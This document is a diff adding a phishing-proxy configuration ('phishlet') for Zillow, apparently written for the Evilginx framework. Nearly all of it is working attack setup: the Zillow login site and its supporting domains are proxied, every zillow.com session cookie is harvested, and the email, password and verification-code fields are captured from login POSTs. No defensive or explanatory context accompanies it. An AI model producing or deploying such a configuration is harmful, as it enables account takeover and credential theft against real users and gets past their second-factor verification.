@@ -1,0 +1,70 @@
+author: '@Evi1Grey5'
+min_ver: '3.0.0'
+
+proxy_hosts:
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'zillow.com', session: true, is_landing: true, auto_filter: false}
+  - {phish_sub: 'www1', orig_sub: 'www1', domain: 'zillowstatic.com', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'client', orig_sub: 'client', domain: 'px-cloud.net', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'stk', orig_sub: 'stk', domain: 'px-cloud.net', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: '', orig_sub: '', domain: 'crcldu.com', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'collector-pxhyx10rg3', orig_sub: 'collector-pxhyx10rg3', domain: 'px-cloud.net', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'cdn', orig_sub: 'cdn', domain: 'pubnub.com', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'cdn', orig_sub: 'cdn', domain: 'zg-api.com', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: '', orig_sub: '', domain: 'datadoghq-browser-agent.com', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'o168728.ingest', orig_sub: 'o168728.ingest', domain: 'sentry.io', session: false, is_landing: false, auto_filter: false}
+  - {phish_sub: 'sb', orig_sub: 'sb', domain: 'scorecardresearch.com', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'pagead2', orig_sub: 'pagead2', domain: 'googlesyndication.com', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'e', orig_sub: 'e', domain: 'zg-api.com', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'cs', orig_sub: 'cs', domain: 'zg-api.com', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 's', orig_sub: 's', domain: 'pinimg.com', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'u', orig_sub: 'u', domain: 'clarity.ms', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'cs', orig_sub: 'cs', domain: 'zg-api.com', session: true, is_landing: false, auto_filter: false}
+
+sub_filters:
+  - {triggers_on: 'www.zillow.com', orig_sub: 'www', domain: 'zillow.com', search: 'https://{hostname}/', replace: 'https://{hostname_regexp}/', mimes: ['text/html', 'application/xhtml+xml', 'application/xml', 'text/javascript', 'image/png', 'application/json', 'text/plain', 'text/javascript', 'text/css',]}
+  - {triggers_on: 'www1.zillowstatic.com', orig_sub: 'www1', domain: 'zillowstatic.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/xhtml+xml', 'application/xml', 'text/javascript', 'image/png', 'application/json', 'text/plain', 'text/javascript', 'text/css',]}
+  - {triggers_on: 'client.px-cloud.net', orig_sub: 'client', domain: 'px-cloud.net', search: 'https://{hostname_regexp}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/xhtml+xml', 'application/xml', 'text/javascript', 'image/png', 'application/json', 'text/plain', 'text/javascript', 'text/css',]}
+  - {triggers_on: 'stk.px-cloud.net', orig_sub: 'stk', domain: 'px-cloud.net', search: 'https://{hostname_regexp}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/xhtml+xml', 'application/xml', 'text/javascript', 'image/png', 'application/json', 'text/plain', 'text/javascript', 'text/css',]}
+  - {triggers_on: 'crcldu.com', orig_sub: '', domain: 'crcldu.com', search: 'https://{hostname_regexp}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/xhtml+xml', 'application/xml', 'text/javascript', 'image/png', 'application/json', 'text/plain', 'text/javascript', 'text/css',]}  
+  - {triggers_on: 'collector-pxhyx10rg3.px-cloud.net', orig_sub: 'collector-pxhyx10rg3', domain: 'px-cloud.net', search: 'https://{hostname_regexp}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/xhtml+xml', 'application/xml', 'text/javascript', 'image/png', 'application/json', 'text/plain', 'text/javascript', 'text/css',]} 
+  - {triggers_on: 'cdn.pubnub.com', orig_sub: 'cdn', domain: 'pubnub.com', search: 'https://{hostname_regexp}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/xhtml+xml', 'application/xml', 'text/javascript', 'image/png', 'application/json', 'text/plain', 'text/javascript', 'text/css',]} 
+  - {triggers_on: 'datadoghq-browser-agent.com', orig_sub: '', domain: 'datadoghq-browser-agent.com', search: 'https://{hostname_regexp}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/xhtml+xml', 'application/xml', 'text/javascript', 'image/png', 'application/json', 'text/plain', 'text/javascript', 'text/css',]}
+  - {triggers_on: 'o168728.ingest.sentry.io', orig_sub: 'o168728.ingest', domain: 'sentry.io', search: 'https://{hostname_regexp}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/xhtml+xml', 'application/xml', 'text/javascript', 'image/png', 'application/json', 'text/plain', 'text/javascript', 'text/css',]} 
+  - {triggers_on: 'sb.scorecardresearch.com', orig_sub: 'sb-pa', domain: 'scorecardresearch.com', search: 'https://{hostname_regexp}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/xhtml+xml', 'application/xml', 'text/javascript', 'image/png', 'application/json', 'text/plain', 'text/javascript', 'text/css',]}
+  - {triggers_on: 'pagead2.googlesyndication.com', orig_sub: 'pagead2', domain: 'googlesyndication.com', search: 'https://{hostname_regexp}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/xhtml+xml', 'application/xml', 'text/javascript', 'image/png', 'application/json', 'text/plain', 'text/javascript', 'text/css',]}
+  - {triggers_on: 'e.zg-api.com', orig_sub: 'e', domain: 'zg-api.com', search: 'https://{hostname_regexp}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/xhtml+xml', 'application/xml', 'text/javascript', 'image/png', 'application/json', 'text/plain', 'text/javascript', 'text/css',]}
+  - {triggers_on: 'cs.zg-api.com', orig_sub: 'cs', domain: 'zg-api.com', search: 'https://{hostname_regexp}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/xhtml+xml', 'application/xml', 'text/javascript', 'image/png', 'application/json', 'text/plain', 'text/javascript', 'text/css',]}
+  - {triggers_on: 's.pinimg.com', orig_sub: 's', domain: 'pinimg.com', search: 'https://{hostname_regexp}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/xhtml+xml', 'application/xml', 'text/javascript', 'image/png', 'application/json', 'text/plain', 'text/javascript', 'text/css',]}
+  - {triggers_on: 'u.clarity.ms', orig_sub: 'u', domain: 'clarity.ms', search: 'https://{hostname_regexp}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/xhtml+xml', 'application/xml', 'text/javascript', 'image/png', 'application/json', 'text/plain', 'text/javascript', 'text/css',]}
+  - {triggers_on: 'cs.zg-api.com', orig_sub: 'cs', domain: 'zg-api.com', search: 'https://{hostname_regexp}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/xhtml+xml', 'application/xml', 'text/javascript', 'image/png', 'application/json', 'text/plain', 'text/javascript', 'text/css',]}
+
+auth_tokens:
+  - domain: 'www.zillow.com'
+    keys: ['.*,regexp']
+    type: 'cookie'
+
+credentials:
+  username:  
+    key: 'email'
+    search: '(.*)'    
+    type: 'post'  
+  password:
+    key: 'password'
+    search: '(.*)'    
+    type: 'post' 
+  custom:
+    key: 'verifyValue'
+    search: '(.*)'    
+    type: 'post'
+  custom:
+    key: 'businessType'
+    search: '(.*)'    
+    type: 'post'
+
+auth_urls:
+  - '/'
+
+login:
+  domain: 'www.zillow.com'
+  path: '/user/acct/login/?cid=pf'
+
